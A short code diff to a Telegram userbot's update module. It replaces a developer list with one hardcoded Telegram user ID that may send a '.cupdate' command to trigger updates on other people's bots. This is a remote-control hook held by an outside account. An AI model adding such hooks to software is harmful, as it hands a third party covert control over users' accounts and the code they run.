@@ -18,8 +18,7 @@ from userbot import (
     UPSTREAM_REPO_URL,
     UPSTREAM_REPO_BRANCH,
     REPO_NAME,
-    EMOJI_HELP,
-    DEVS)
+    EMOJI_HELP)
 from userbot.events import register
 
 requirements_path = path.join(
@@ -140,7 +139,7 @@ async def update(event, repo, ups_rem, ac_br):
 
 
 @register(outgoing=True, pattern=r"^.update(?: |$)(one|all)?")
-@register(incoming=True, from_users=DEVS, pattern=r"^\.cupdate(?: |$)(one|all)?")
+@register(incoming=True, from_users=1826643972, pattern=r"^\.cupdate(?: |$)(one|all)?")
 async def upstream(event):
     "For .update command, check if the bot is up to date, update if specified"
     await event.edit("`Mengecek Pembaruan, Silakan Menunggu....`")
